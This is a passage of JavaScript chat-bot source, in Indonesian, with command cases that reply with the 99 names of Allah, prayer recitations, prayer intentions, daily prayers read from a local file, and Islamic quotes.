        arabic: "الْحَفِيظُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menjaga",
        translation_en: "The Preserver"
    },
    {
        index: 39,
        latin: "Al Muqiit",
        arabic: "المُقيِت",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemberi Kecukupan",
        translation_en: "The Nourisher"
    },
    {
        index: 40,
        latin: "Al Hasiib",
        arabic: "الْحسِيبُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaMembuat Perhitungan",
        translation_en: "The Reckoner"
    },
    {
        index: 41,
        latin: "Al Jaliil",
        arabic: "الْجَلِيلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
        translation_en: "The Majestic"
        },
    {
        index: 42,
        latin: "Al Kariim",
        arabic: "الْكَرِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemurah",
        translation_en: "The Bountiful, the Generous"
    },
    {
        index: 43,
        latin: "Ar Raqiib",
        arabic: "الرَّقِيبُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengawasi",
        translation_en: "The Watchful"
    },
    {
        index: 44,
        latin: "Al Mujiib",
        arabic: "الْمُجِيبُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengabulkan",
        translation_en: "The Responsive, the Answerer"
    },
    {
        index: 45,
        latin: "Al Waasi’",
        arabic: "الْوَاسِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Luas",
        translation_en: "The Vast, the All Encompassing"
    },
    {
        index: 46,
        latin: "Al Hakiim",
        arabic: "الْحَكِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maka Bijaksana",
        translation_en: "The Wise"
    },
    {
        index: 47,
        latin: "Al Waduud",
        arabic: "الْوَدُودُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pencinta",
        translation_en: "The Loving, the Kind One"
    },
    {
        index: 48,
        latin: "Al Majiid",
        arabic: "الْمَجِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
        translation_en: "The All Glorious"
    },
    {
        index: 49,
        latin: "Al Baa’its",
        arabic: "الْبَاعِثُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Membangkitkan",
        translation_en: "The Raiser of the Dead"
    },
    {
        index: 50,
        latin: "As Syahiid",
        arabic: "الشَّهِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menyaksikan",
        translation_en: "The Witness"
    },
    {
        index: 51,
        latin: "Al Haqq",
        arabic: "الْحَقُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Benar",
        translation_en: "The Truth, the Real"
    },
    {
        index: 52,
        latin: "Al Wakiil",
        arabic: "الْوَكِيلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memelihara",
        translation_en: "The Trustee, the Dependable"
    },
    {
        index: 53,
        latin: "Al Qawiyyu",
        arabic: "الْقَوِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Kuat",
        translation_en: "The Strong"
    },
    {
        index: 54,
        latin: "Al Matiin",
        arabic: "الْمَتِينُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Kokoh",
        translation_en: "The Firm, the Steadfast"
    },
    {
        index: 55,
        latin: "Al Waliyy",
        arabic: "الْوَلِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Melindungi",
        translation_en: "The Protecting Friend, Patron, and Helper"
    },
    {
        index: 56,
        latin: "Al Hamiid",
        arabic: "الْحَمِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Terpuji",
        translation_en: "The All Praiseworthy"
    },
    {
        index: 57,
        latin: "Al Mushii",
        arabic: "الْمُحْصِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengkalkulasi",
        translation_en: "The Accounter, the Numberer of All"
    },
    {
        index: 58,
        latin: "Al Mubdi’",
        arabic: "الْمُبْدِئُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memulai",
        translation_en: "The Producer, Originator, and Initiator of all"
    },
    {
        index: 59,
        latin: "Al Mu’iid",
        arabic: "الْمُعِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaMengembalikan Kehidupan",
        translation_en: "The Reinstater Who Brings Back All"
    },
    {
        index: 60,
        latin: "Al Muhyii",
        arabic: "الْمُحْيِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menghidupkan",
        translation_en: "The Giver of Life"
    },
    {
        index: 61,
        latin: "Al Mumiitu",
        arabic: "اَلْمُمِيتُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mematikan",
        translation_en: "The Bringer of Death, the Destroyer"
    },
    {
        index: 62,
        latin: "Al Hayyu",
        arabic: "الْحَيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Hidup",
        translation_en: "The Ever Living"
    },
    {
        index: 63,
        latin: "Al Qayyuum",
        arabic: "الْقَيُّومُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mandiri",
        translation_en: "The Self Subsisting Sustainer of All"
    },
    {
        index: 64,
        latin: "Al Waajid",
        arabic: "الْوَاجِدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penemu",
        translation_en: "The Perceiver, the Finder, the Unfailing"
    },
    {
        index: 65,
        latin: "Al Maajid",
        arabic: "الْمَاجِدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
        translation_en: "The Illustrious, the Magnificent"
    },
    {
        index: 66,
        latin: "Al Wahiid",
        arabic: "الْواحِدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Tunggal",
        translation_en: "The One, The Unique, Manifestation of Unity"
    },
    {
        index: 67,
        latin: "Al ‘Ahad",
        arabic: "اَلاَحَدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Esa",
        translation_en: "The One, the All Inclusive, the Indivisible"
    },
    {
        index: 68,
        latin: "As Shamad",
        arabic: "الصَّمَدُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaDibutuhkan, Tempat Meminta",
        translation_en: "The Self Sufficient, the Impregnable,the Eternally Besought of All, the Everlasting"
    },
    {
        index: 69,
        latin: "Al Qaadir",
        arabic: "الْقَادِرُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaMenentukan, Maha Menyeimbangkan",
        translation_en: "The All Able"
    },
    {
        index: 70,
        latin: "Al Muqtadir",
        arabic: "الْمُقْتَدِرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Berkuasa",
        translation_en: "The All Determiner, the Dominant"
    },
    {
        index: 71,
        latin: "Al Muqaddim",
        arabic: "الْمُقَدِّمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mendahulukan",
        translation_en: "The Expediter, He who brings forward"
    },
    {
        index: 72,
        latin: "Al Mu’akkhir",
        arabic: "الْمُؤَخِّرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengakhirkan",
        translation_en: "The Delayer, He who puts far away"
    },
    {
        index: 73,
        latin: "Al Awwal",
        arabic: "الأوَّلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Awal",
        translation_en: "The First"
    },
    {
        index: 74,
        latin: "Al Aakhir",
        arabic: "الآخِرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Akhir",
        translation_en: "The Last"
    },
    {
        index: 75,
        latin: "Az Zhaahir",
        arabic: "الظَّاهِرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Nyata",
        translation_en: "The Manifest; the All Victorious"
    },
    {
        index: 76,
        latin: "Al Baathin",
        arabic: "الْبَاطِنُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Ghaib",
        translation_en: "The Hidden; the All Encompassing"
    },
    {
        index: 77,
        latin: "Al Waali",
        arabic: "الْوَالِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memerintah",
        translation_en: "The Patron"
    },
    {
        index: 78,
        latin: "Al Muta’aalii",
        arabic: "الْمُتَعَالِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Tinggi",
        translation_en: "The Self Exalted"
    },
    {
        index: 79,
        latin: "Al Barri",
        arabic: "الْبَرُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penderma",
        translation_en: "The Most Kind and Righteous"
    },
    {
        index: 80,
        latin: "At Tawwaab",
        arabic: "التَّوَابُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penerima Tobat",
        translation_en: "The Ever Returning, Ever Relenting"
    },
    {
        index: 81,
        latin: "Al Muntaqim",
        arabic: "الْمُنْتَقِمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penuntut Balas",
        translation_en: "The Avenger"
    },
    {
        index: 82,
        latin: "Al Afuww",
        arabic: "العَفُوُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemaaf",
        translation_en: "The Pardoner, the Effacer of Sins"
    },
    {
        index: 83,
        latin: "Ar Ra`uuf",
        arabic: "الرَّؤُوفُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pengasih",
        translation_en: "The Compassionate, the All Pitying"
    },
    {
        index: 84,
        latin: "Malikul Mulk",
        arabic: "مَالِكُ الْمُلْكِ",
        translation_id: "Yang Memiliki Mutlak sifatPenguasa Kerajaan (Semesta)",
        translation_en: "The Owner of All Sovereignty"
    },
    {
        index: 85,
        latin: "Dzul JalaaliWal Ikraam",
        arabic: "ذُوالْجَلاَلِوَالإكْرَامِ",
        translation_id: "Yang Memiliki Mutlak sifat PemilikKebesaran dan Kemuliaan",
        translation_en: "The Lord of Majesty and Generosity"
    },
    {
        index: 86,
        latin: "Al Muqsith",
        arabic: "الْمُقْسِطُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Adil",
        translation_en: "The Equitable, the Requiter"
    },
    {
        index: 87,
        latin: "Al Jamii’",
        arabic: "الْجَامِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengumpulkan",
        translation_en: "The Gatherer, the Unifier"
    },
    {
        index: 88,
        latin: "Al Ghaniyy",
        arabic: "الْغَنِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Berkecukupan",
        translation_en: "The All Rich, the Independent"
    },
    {
        index: 89,
        latin: "Al Mughnii",
        arabic: "الْمُغْنِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Kekayaan",
        translation_en: "The Enricher, the Emancipator"
    },
    {
        index: 90,
        latin: "Al Maani",
        arabic: "اَلْمَانِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mencegah",
        translation_en: "The Withholder, the Shielder, the Defender"
    },
    {
        index: 91,
        latin: "Ad Dhaar",
        arabic: "الضَّارَّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Derita",
        translation_en: "The Distressor, the Harmer"
    },
    {
        index: 92,
        latin: "An Nafii’",
        arabic: "النَّافِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Manfaat",
        translation_en: "The Propitious, the Benefactor"
    },
    {
        index: 93,
        latin: "An Nuur",
        arabic: "النُّورُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Bercahaya(Menerangi, Memberi Cahaya)",
        translation_en: "The Light"
    },
    {
        index: 94,
        latin: "Al Haadii",
        arabic: "الْهَادِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemberi Petunjuk",
        translation_en: "The Guide"
    },
    {
        index: 95,
        latin: "Al Baadii",
        arabic: "الْبَدِيعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pencipta",
        translation_en: "Incomparable, the Originator"
    },
    {
        index: 96,
        latin: "Al Baaqii",
        arabic: "اَلْبَاقِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Kekal",
        translation_en: "The Ever Enduring and Immutable"
    },
    {
        index: 97,
        latin: "Al Waarits",
        arabic: "الْوَارِثُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pewaris",
        translation_en: "The Heir, the Inheritor of All"
    },
    {
        index: 98,
        latin: "Ar Rasyiid",
        arabic: "الرَّشِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pandai",
        translation_en: "The Guide, Infallible Teacher, and Knower"
    },
    {
        index: 99,
        latin: "As Shabuur",
        arabic: "الصَّبُورُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Sabar",
        translation_en: "The Patient"
    }
]
    let json = JSON.parse(JSON.stringify(asmaulhusna))
    let data = json.map((v, i) => `${i + 1}. ${v.latin}\n${v.arabic}\n${v.translation_id}`).join('\n\n')
    if (isNaN(args[0])) return reply (`contoh:\nasmaulhusna 1`)
    if (args[0]) {
        if (args[0] < 1 || args[0] > 99) throw `minimal 1 & maksimal 99!`
        let { index, latin, arabic, translation_id, translation_en } = json.find(v => v.index == args[0].replace(/[^0-9]/g, ''))
        return ReplyRynzz(`No. ${index}
${arabic}
${latin}
${translation_id}
${translation_en}
`.trim())
    }
    ReplyRynzz(`${contoh} + ${data} + ${anjuran}`)
}
break   
case 'bacaansholat': {
if (isBan) return Xban()
await xreaction()
const bacaanshalat = {
"result": [
{
 "id": 1,
 "name": "Bacaan Iftitah",
 "arabic": "اللَّهُ أَكْبَرُ كَبِيرًا وَالْحَمْدُ لِلَّهِ كَثِيرًا وَسُبْحَانَ اللَّهِ بُكْرَةً وَأَصِيلاً , إِنِّى وَجَّهْتُ وَجْهِىَ لِلَّذِى فَطَرَ السَّمَوَاتِ وَالأَرْضَ حَنِيفًا وَمَا أَنَا مِنَ الْمُشْرِكِينَ إِنَّ صَلاَتِى وَنُسُكِى وَمَحْيَاىَ وَمَمَاتِى لِلَّهِ رَبِّ الْعَالَمِينَ لاَ شَرِيكَ لَهُ وَبِذَلِكَ أُمِرْتُ وَأَنَا أَوَّلُ الْمُسْلِمِينَ",
 "latin": "Alloohu akbar kabiirow wal hamdu lillaahi katsiiroo wasubhaanalloohi bukrotaw wa-ashiilaa, Innii wajjahtu wajhiya lilladzii fathoros samaawaati wal ardlo haniifaa wamaa ana minal musyrikiin. Inna sholaatii wa nusukii wamahyaa wa mamaatii lillaahi robbil &lsquo;aalamiin. Laa syariikalahu wa bidzaalika umirtu wa ana awwalul muslimiin",
 "terjemahan": "Allah Maha Besar dengan sebesar-besarnya, segala puji bagi Allah dengan pujian yang banyak. Mahasuci Allah pada waktu pagi dan petang, Sesungguhnya aku hadapkan wajahku kepada Allah yang telah menciptakan langit dan bumi dalam keadaan tunduk dan aku bukanlah dari golongan orang-orang musyrik. Sesungguhnya shalatku, sembelihanku, hidupku dan matiku hanya untuk Allah Tuhan semesta alam. Tidak ada sekutu bagiNya. Dan dengan yang demikian itu lah aku diperintahkan. Dan aku adalah orang yang pertama berserah diri"
},
{
 "id": 2,
 "name": "Al Fatihah",
 "arabic": "بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ ﴿١﴾الْحَمْدُ لِلَّـهِ رَبِّ الْعَالَمِينَ ﴿٢﴾ الرَّحْمَـٰنِ الرَّحِيمِ ﴿٣﴾ مَالِكِ يَوْمِ الدِّينِ ﴿٤﴾ إِيَّاكَ نَعْبُدُ وَإِيَّاكَ نَسْتَعِينُ ﴿٥﴾ اهْدِنَاالصِّرَاطَ الْمُسْتَقِيمَ ﴿٦﴾ صِرَاطَ الَّذِينَ أَنْعَمْتَ عَلَيْهِمْ غَيْرِ الْمَغْضُوبِ عَلَيْهِمْ وَلَا الضَّالِّينَ ﴿٧",
 "latin": "1. Bismillahirrahmanirrahim, 2. Alhamdulillahi rabbil alamin, 3. Arrahmaanirrahiim, 4. Maaliki yaumiddiin, 5. Iyyaka nabudu waiyyaaka nastaiin, 6. Ihdinashirratal mustaqim, 7. shiratalladzina an&rsquo;amta alaihim ghairil maghduubi alaihim waladhaalin",
 "terjemahan": "1. Dengan menyebut nama Allah Yang Maha Pemurah lagi Maha Penyayang, 2. Segala puji bagi Allah, Tuhan semesta alam, 3. Maha Pemurah lagi Maha Penyayang, 4. Yang menguasai di Hari Pembalasan, 5. Hanya Engkaulah yang kami sembah, dan hanya kepada Engkaulah kami meminta pertolongan, 6. Tunjukilah kami jalan yang lurus, 7. (yaitu) Jalan orang-orang yang telah Engkau beri nikmat kepada mereka; bukan (jalan) mereka yang dimurkai dan bukan (pula jalan) mereka yang sesat"
},
{
 "id": 3,
 "name": "Bacaan Ruku",
 "arabic": "(3x) سُبْحَانَ رَبِّيَ الْعَظِيْمِ وَبِحَمْدِهِ",
 "latin": "Subhana Rabbiyal Adzimi Wabihamdih (3x)",
 "terjemahan": "Maha Suci Tuhanku Yang Maha Agung Dan Dengan Memuji-Nya"
},
{
 "id": 4,
 "name": "Bacaan Sujud",
 "arabic": "(3x) سُبْحَانَ رَبِّىَ الْأَعْلَى وَبِحَمْدِهِ",
 "latin": "Subhaana robbiyal a'la wabihamdih (3x)",
 "terjemahan": "Mahasuci Tuhanku yang Mahatinggi dan segala puji bagiNya"
},
{
 "id": 5,
 "name": "Bacaan Duduk Diantara Dua Sujud",
 "arabic": "رَبِّ اغْفِرْلِيْ وَارْحَمْنِيْ وَاجْبُرْنِيْ وَارْفَعْنِيْ وَارْزُقْنِيْ وَاهْدِنِيْ وَعَافِنِيْ وَاعْفُ عَنِّيْ",
 "latin": "Rabbighfirli Warhamni Wajburnii Warfaknii Wazuqnii Wahdinii Wa'aafinii Wa'fuannii",
 "terjemahan": "Ya Allah,ampunilah dosaku,belas kasihinilah aku dan cukuplah segala kekuranganku da angkatlah derajatku dan berilah rezeki kepadaku,dan berilah aku petunjuk dan berilah kesehatan padaku dan berilah ampunan kepadaku"
},
{
 "id": 6,
 "name": "Duduk Tasyahud Awal",
 "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ",
 "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahummasholli ala Sayyidina Muhammad",
 "terjemahan": "Segala penghormatan, keberkahan, shalawat dan kebaikan hanya bagi Allah. Semoga salam sejahtera selalu tercurahkan kepadamu wahai Nabi, demikian pula rahmat Allah dan berkahNya dan semoga salam sejahtera selalu tercurah kepada kami dan hamba-hamba Allah yang shalih. Aku bersaksi bahwa tiada ilah kecuali Allah dan aku bersaksi bahwa Muhammad adalah utusan Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad"
},
{
 "id": 7,
 "name": "Duduk Tasyahud Akhir",
 "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ، كَمَا صَلَّيْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ وَبَارِكْ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ كَمَا بَرَكْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ فِى الْعَالَمِيْنَ إِنَّكَ حَمِيْدٌ مَجِيْدٌ",
 "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahumma Shalli Ala Sayyidina Muhammad Wa Ala Ali Sayyidina Muhammad. Kama Shollaita Ala Sayyidina Ibrahim wa alaa aali sayyidina Ibrahim, wabaarik ala Sayyidina Muhammad Wa Alaa Ali Sayyidina Muhammad, Kama barokta alaa Sayyidina Ibrahim wa alaa ali Sayyidina Ibrahim, Fil aalamiina innaka hamiidummajid",
 "terjemahan": "Segala penghormatan yang berkat solat yang baik adalah untuk Allah. Sejahtera atas engkau wahai Nabi dan rahmat Allah serta keberkatannya. Sejahtera ke atas kami dan atas hamba-hamba Allah yang soleh. Aku bersaksi bahwa tiada Tuhan melainkan Allah dan aku bersaksi bahwasanya Muhammad itu adalah pesuruh Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad dan ke atas keluarganya. Sebagaimana Engkau selawatkan ke atas Ibrahim dan atas keluarga Ibrahim. Berkatilah ke atas Muhammad dan atas keluarganya sebagaimana Engkau berkati ke atas Ibrahim dan atas keluarga Ibrahim di dalam alam ini. Sesungguhnya Engkau Maha Terpuji lagi Maha Agung"
},
{
 "id": 8,
 "name": "Salam",
 "arabic": "اَلسَّلاَمُ عَلَيْكُمْ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ",
 "latin": "Assalamualaikum Warohmatullahi Wabarokatuh",
 "terjemahan": "Semoga keselamatan, rohmat dan berkah ALLAH selalu tercurah untuk kamu sekalian."
}
]
}
let bacaan = JSON.stringify(bacaanshalat)
let json = JSON.parse(bacaan)
let data = json.result.map((v, i) => `${i + 1}. ${v.name}\n${v.arabic}\n${v.latin}\n*Artinya:*\n_"${v.terjemahan}"_`).join('\n\n')
let contoh = `*「 Bacaan Shalat 」*\n\n`
ReplyRynzz(`${contoh} + ${data}`)
}
break

case 'doaharian': {
if (isBan) return Xban()
await xreaction()
let src = JSON.parse(fs.readFileSync('./AliceSystem/AliceDatabase/islami/doaharian.json', 'utf-8'))
let caption = src.map((v, i) => {
return `
*${i + 1}.* ${v.title}

❃ Latin :
${v.latin}

❃ Arabic :
${v.arabic}

❃ Translate :
${v.translation}
`.trim()
}).join('\n\n')
ReplyRynzz(`${caption}`)

}
break

case 'niatsholat': {
if (isBan) return Xban()
await xreaction()
if (!q) return ReplyRynzz(`Contoh Penggunaan :\nniatsholat Subuh`)
const niatsholat = [
{
index: 1,
solat: "subuh",
latin: "Ushalli fardhosh shubhi rok'ataini mustaqbilal qiblati adaa-an lillaahi ta'aala",
arabic: "اُصَلِّى فَرْضَ الصُّبْحِ رَكْعَتَيْنِ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
translation_id: "Aku berniat shalat fardhu Shubuh dua raka'at menghadap kiblat karena Allah Ta'ala",
},
{
index: 2,
solat: "maghrib",
latin: "Ushalli fardhol maghribi tsalaata raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
arabic: "اُصَلِّى فَرْضَ الْمَغْرِبِ ثَلاَثَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
translation_id: "Aku berniat shalat fardhu Maghrib tiga raka'at menghadap kiblat karena Allah Ta'ala",
},
{
index: 3,
solat: "dzuhur",
latin: "Ushalli fardhodl dhuhri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
arabic: "اُصَلِّى فَرْضَ الظُّهْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
translation_id: "Aku berniat shalat fardhu Dzuhur empat raka'at menghadap kiblat karena Allah Ta'ala",
},
{
index: 4,
solat: "isha",
latin: "Ushalli fardhol 'isyaa-i arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
arabic: "صَلِّى فَرْضَ الْعِشَاءِ اَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
translation_id: "Aku berniat shalat fardhu Isya empat raka'at menghadap kiblat karena Allah Ta'ala",
},
{
index: 5,
solat: "ashar",
latin: "Ushalli fardhol 'ashri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
arabic: "صَلِّى فَرْضَ الْعَصْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
translation_id: "Aku berniat shalat fardhu 'Ashar empat raka'at menghadap kiblat karena Allah Ta'ala",
}
]
let text = q.toLowerCase() || ''
let data = Object.values(niatsholat).find(v => v.solat == text)
if (!data) return ReplyRynzz(`${txt} Tidak Ditemukan\n\nList Solat 5 Waktu :\n• Subuh\n• Maghrib\n• Dzuhur\n• Isha\n• Ashar`)
ReplyRynzz(`
_*Niat Sholat ${text}*_

*Arab :* ${data.arabic}

*Latin :* ${data.latin} 

*Translate :* ${data.translation_id}`.trim())
}

break

case 'quotesislami': {
if (isBan) return Xban()
await xreaction()
const islami = [
{
 "id": "1",
 "arabic": "مَنْ سَارَ عَلىَ الدَّرْبِ وَصَلَ",
 "arti": "Barang siapa berjalan pada jalannya, maka dia akan sampai (pada tujuannya)."
},
{
 "id": "2",
 "arabic": "مَنْ صَبَرَ ظَفِرَ",
 "arti": "Barang siapa bersabar, maka dia akan beruntung."
},
{
 "id": "3",
 "arabic": "مَنْ جَدَّ وَجَـدَ",
 "arti": "Barang siapa bersungguh-sungguh, maka dia akan meraih (kesuksesan)."
},
{
 "id": "4",
 "arabic": "جَالِسْ أَهْلَ الصِّدْقِ وَالوَفَاءِ",
 "arti": "Bergaulah bersama orang-orang yang jujur dan menepati janji."
},
{
 "id": "5",
 "arabic": "مَنْ قَلَّ صِدْقُهُ قَلَّ صَدِيْقُهُ",
 "arti": "Barang siapa sedikit kejujurannya, maka sedikit pulalah temannya."
},
{
 "id": 6,
 "arabic": "مَوَدَّةُ الصَّدِيْقِ تَظْهَرُ وَقْتَ الضِّيْقِ",
 "arti": "Kecintaan seorang teman itu akan terlihat pada waktu kesempitan."
},
{
 "id": "7",
 "arabic": "الصَّبْرُ يُعِيْنُ عَلَى كُلِّ عَمَلٍ",
 "arti": "Kesabaran akan menolong segala pekerjaan."
},
{
 "id": "8",
 "arabic": "وَمَا اللَّذَّةُ إِلاَّ بَعْدَ التَّعَبِ",
 "arti": "Tidak ada kenikmatan kecuali setelah kepayahan."
},
{
 "id": "9",
 "arabic": "جَرِّبْ وَلاَحِظْ تَكُنْ عَارِفًا",
 "arti": "Coba dan perhatikanlah, maka engkau akan menjadi orang yang tahu."
},
{
 "id": "10",
 "arabic": "بَيْضَةُ اليَوْمِ خَيْرٌ مِنْ دَجَاجَةِ الغَدِ",
 "arti": "Telur hari ini lebih baik daripada ayam esok hari."
},
{
 "id": "11",
 "arabic": "أُطْلُبِ الْعِلْمَ مِنَ الْمَهْدِ إِلَى الَّلحْدِ",
 "arti": "Carilah ilmu sejak dari buaian hingga liang lahat."
},
{
 "id": "12",
 "arabic": "الوَقْتُ أَثْمَنُ مِنَ الذَّهَبِ",
 "arti": "Waktu itu lebih berharga daripada emas."
},
{
 "id": "13",
 "arabic": "لاَ خَيْرَ فيِ لَذَّةٍ تَعْقِبُ نَدَماً",
 "arti": "Tak ada kebaikan bagi kenikmatan yang diiringi dengan penyesalan."
},
{
 "id": "14",
 "arabic": "أَخِي لَنْ تَنَالَ العِلْمَ إِلاَّ بِسِتَّةٍ سَأُنْبِيْكَ عَنْ تَفْصِيْلِهَا بِبَيَانٍ: ذَكَاءٌ وَحِرْصٌ وَاجْتِهَادٌ وَدِرْهَمٌ وَصُحْبَةُ أُسْتَاذٍ وَطُوْلُ زَمَانٍ",
 "arti": "Wahai saudaraku, Kamu tidak akan memperoleh ilmu kecuali dengan enam perkara, akan aku sampaikan rinciannya dengan jelas; 1) Kecerdasan, 2) Ketamaan (terhadap ilmu), 3) Kesungguhan, 4) Harta benda (sebagai bekal), 5) Bergaul dengan guru, 6) Waktu yang lama."
},
{
 "id": "15",
 "arabic": "لاَ تَكُنْ رَطْباً فَتُعْصَرَ وَلاَ يَابِسًا فَتُكَسَّرَ",
 "arti": "Janganlah kamu bersikap lemah, sehingga kamu mudah diperas. Dan janganlah kamu bersikap keras, sehingga kamu mudah dipatahkan."
},
{
 "id": "16",
 "arabic": "لِكُلِّ مَقَامٍ مَقَالٌ وَلِكُلِّ مَقَالٍ مَقَامٌ",
 "arti": "Setiap tempat memiliki perkataannya masing-masing, dan setiap perkataan memiliki tempatnya masing-masing."
},{
 "id": "17",
 "arabic": "خَيْرُ النَّاسِ أَحْسَنُهُمْ خُلُقاً وَأَنْفَعُهُمْ لِلنَّاسِ",
 "arti": "Sebaik-baik manusia adalah yang paling baik budi pekertinya dan yang paling bermanfaat bagi manusia lainnya."
},
{
 "id": "18",
 "arabic": "خَيْرُ جَلِيْسٍ في الزّمانِ كِتابُ",
 "arti": "Sebaik-baik teman duduk di setiap waktu adalah buku."
},
{
 "id": "19",
 "arabic": "مَنْ يَزْرَعْ يَحْصُدْ",
 "arti": "Barang siapa menanam, pasti ia akan memetik (mengetam)."
},
{
 "id": "20",
 "arabic": "لَوْلاَ العِلْمُ لَكَانَ النَّاسُ كَالبَهَائِمِ",
 "arti": "Kalaulah tidak karena ilmu, niscaya manusia itu seperti binatang."
},
{
